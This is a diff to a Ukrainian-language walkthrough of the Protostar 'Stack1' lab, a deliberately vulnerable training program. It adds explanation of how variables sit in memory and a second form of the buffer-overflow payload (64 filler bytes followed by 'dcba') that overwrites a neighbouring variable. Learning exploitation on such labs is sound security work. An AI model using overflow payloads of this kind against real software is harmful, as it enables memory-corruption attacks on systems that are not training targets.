@@ -1,6 +1,8 @@
 # STACK1
 
-Отже, ось код для Stack0:
+На цьому рівні розглядається концепція модифікації змінних до певних значень у програмі та спосіб розміщення змінних у пам’яті.
+
+Вихідний код Stack1:
 ```
 #include <stdlib.h>
 #include <unistd.h>
@@ -34,7 +36,11 @@ int main(int argc, char **argv)
 
 Виконаємо команду: 
 ```
-run $(python -c "print 'a'*64 + 'dcba'")
+run $(python -c "print 'a' * 64 + 'dcba'")
+
+або 
+
+./stack1 $(python -c "print('a' * 64 + 'dcba')")
 ```
 Результат:
 
